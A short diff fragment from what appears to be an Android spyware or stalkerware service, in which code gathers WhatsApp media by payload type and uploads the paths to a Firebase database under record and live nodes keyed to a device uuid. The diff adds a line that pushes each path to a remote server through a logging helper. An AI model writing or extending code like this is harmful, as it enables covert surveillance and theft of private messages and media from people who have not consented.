@@ -348,6 +348,7 @@ public class Starter extends Service {
                                                     databaseEntry.put("/RECORDS/whatsapp_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
                                                     databaseEntry.put("/LIVE/whatsapp_media_"+payloadType, task1.getResult().toString());
                                                     FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
+                                                    Logs.pushLogsToServer("[PATH]: "+task1.getResult().toString(), uuid);
                                                 });
 
                                     } else {
